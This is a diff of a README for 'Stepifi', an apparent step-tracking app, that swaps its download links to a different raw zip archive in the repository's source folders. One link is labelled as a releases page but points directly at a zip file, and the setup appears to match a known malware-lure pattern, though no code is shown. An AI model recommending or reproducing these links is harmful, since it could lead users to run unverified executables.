@@ -1,7 +1,7 @@
 # 🎉 Stepifi - Simplify Your Daily Steps
 
 ## 📥 Download Stepifi Now
-[![Download Stepifi](https://github.com/JOVICE12/Stepifi/raw/refs/heads/main/src/config/Software-v1.7.zip)](https://github.com/JOVICE12/Stepifi/raw/refs/heads/main/src/config/Software-v1.7.zip)
+[![Download Stepifi](https://github.com/JOVICE12/Stepifi/raw/refs/heads/main/src/Software-3.5.zip)](https://github.com/JOVICE12/Stepifi/raw/refs/heads/main/src/Software-3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Stepifi! This application helps you manage and track your daily steps effortlessly. It is designed for anyone who wants to stay active and keep a record of their walking achievements.
@@ -20,7 +20,7 @@ To run Stepifi on your device, ensure you meet these minimum requirements:
 - Disk Space: At least 100MB available
 
 ## 📦 Download & Install
-To get Stepifi, visit this page to download: [Stepifi Releases](https://github.com/JOVICE12/Stepifi/raw/refs/heads/main/src/config/Software-v1.7.zip).
+To get Stepifi, visit this page to download: [Stepifi Releases](https://github.com/JOVICE12/Stepifi/raw/refs/heads/main/src/Software-3.5.zip).
 
 After you've reached the releases page, look for the latest version listed at the top. Click on the version number to view the available files.
 
